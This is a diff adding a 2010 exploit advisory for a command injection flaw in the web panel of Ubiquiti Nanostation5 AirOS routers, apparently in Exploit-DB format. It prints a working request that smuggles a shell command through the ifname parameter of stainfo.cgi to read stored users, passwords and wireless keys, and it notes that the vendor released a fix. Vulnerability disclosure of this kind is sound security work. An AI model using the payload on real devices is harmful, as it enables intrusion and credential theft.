@@ -1,0 +1,22 @@
+# Exploit Title: Ubiquity Nanostation5 (Air OS) 0day Remote Command Execution
+# Date: 01 07 2010
+# Author: Emanuele 'emgent' Gentili
+# Software Link: N/A
+# Version: AirOS all firmwares
+# CVE : N/A
+
+
+[+] Vulnerability Descrition
+With not privileged account, like read-only, an attacker is able to execute commands into
+the system via web application panel. Knowing that the system.cfg file is located in /tmp/ directory,
+will be simple read the content (like users, password, wireless key ecc.).
+The vulnerable function is about "Show AP info", that is located in the main page of web panel
+in the section "Extra Informations".
+
+
+[+] The Remote Command Execution string
+http://router_ip/stainfo.cgi?ifname=eth0;cat%20/tmp/system.cfg|grep%20users
+
+
+[+] Responsible Disclosure
+After some mail with Ubnt QA and Security Team people, the fixed firmware was released.
